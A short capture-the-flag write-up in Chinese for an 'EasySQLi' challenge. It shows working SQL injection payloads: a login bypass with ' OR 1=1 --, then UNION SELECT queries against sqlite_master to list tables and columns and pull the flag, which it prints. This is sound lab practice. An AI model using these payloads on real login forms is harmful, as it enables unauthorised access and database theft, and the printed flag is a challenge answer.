## EasySQLi
hackmd 連結 : [EasySQLi](https://hackmd.io/@yeyeye618/rJ7DZ_cogg)
![image](https://hackmd.io/_uploads/H1AVfOqoxl.png)
有登入畫面 
而且名稱跟 SQL 有關
直接 sql injection
![image](https://hackmd.io/_uploads/B1oXpOqiex.png)
```
username= ' OR 1=1 --
password= ' OR 1=1 --
```
![image](https://hackmd.io/_uploads/r1zKzd5ogx.png)
發現可以 SQL語法 串接
用 UNION SELECT 撈 所有 table 名稱
```
username= CYSUN' UNION SELECT name,name,name FROM sqlite_master WHERE type='table
password= ' OR 1=1 --
```
![image](https://hackmd.io/_uploads/H1HwQ_qjxx.png)
有一個 secrets 的 table
撈 table 的欄位
```
username= CYSUN' UNION SELECT sql,sql,sql FROM sqlite_master WHERE tbl_name='secrets
password= ' OR 1=1 --
```
![image](https://hackmd.io/_uploads/rkEi4uqolg.png)
有 id 跟 flag 這兩個欄位
撈 flag 欄位
```
username= ' UNION SELECT flag,flag,flag FROM secrets --
password= ' OR 1=1 --
```
![image](https://hackmd.io/_uploads/BJCRVu9iee.png)
就撈到 flag 了
flag : `is1abCTF{UcCE5sFu11y_L34KeD_$EcRET_D@7A}`
